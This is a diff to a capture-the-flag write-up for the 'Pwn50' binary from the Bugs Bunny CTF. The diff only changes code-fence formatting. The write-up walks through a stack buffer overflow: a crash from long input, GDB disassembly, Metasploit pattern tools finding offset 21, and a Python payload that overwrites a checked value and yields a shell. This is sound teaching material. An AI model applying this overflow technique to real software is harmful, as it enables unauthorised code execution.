@@ -7,13 +7,15 @@ just write something when connect , its always UP
 ## output
 We try to connect and input a lot of char:
 
-```~/Documents/challenge/CTF/Bugs\_Bunny/Pwn50$ ./pwn50 
+```
+~/Documents/challenge/CTF/Bugs\_Bunny/Pwn50$ ./pwn50 
 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
 Erreur de segmentation (core dumped)```
 
 So we open the binary in GDB:
 
-```~/Documents/challenge/CTF/Bugs_Bunny/Pwn50$ gdb ./pwn50 
+```
+~/Documents/challenge/CTF/Bugs_Bunny/Pwn50$ gdb ./pwn50 
 GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1
 Copyright (C) 2016 Free Software Foundation, Inc.
 License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
@@ -79,11 +81,13 @@ End of assembler dump.```
 We remark that there are 3 cmp *al* versus *0x62 0x75 0x67*, which in ASCII world means bug. Then we look which are the char of the overflow that are compared to *0xdefaced*.
 
 First we generate a pattern:
-```# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 50
+```
+# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 50
 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab```
 
 Then we use the pattern as input after the bug string:
-```gdb-peda$ b * 0x0000000000400687
+```
+gdb-peda$ b * 0x0000000000400687
 Breakpoint 1 at 0x400687
 gdb-peda$ r
 Starting program: /home/tenflo/Documents/challenge/CTF/Bugs_Bunny/Pwn50/pwn50 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA'
@@ -143,11 +147,13 @@ gdb-peda$ x/xw $rbp-0x18
 0x7fffffffdcd8:	0x41376141```
 
 Then we use pattern\_offset to know the offset that is compared to *0xdefaced*:
-```# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 50 -q 0x41376141
+```
+# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 50 -q 0x41376141
 [*] Exact match at offset 21```
 
 We test locally if it's the right solution:
-```~/Documents/challenge/CTF/Bugs_Bunny/Pwn50$ python -c "print 'bug'+'A'*21+'\xed\xac\xef\x0d'" > input.hex
+```
+~/Documents/challenge/CTF/Bugs_Bunny/Pwn50$ python -c "print 'bug'+'A'*21+'\xed\xac\xef\x0d'" > input.hex
 ~/Documents/challenge/CTF/Bugs_Bunny/Pwn50$ (cat input.hex ; cat) | ./pwn50 
 Cool Stuff :p!
 whoami
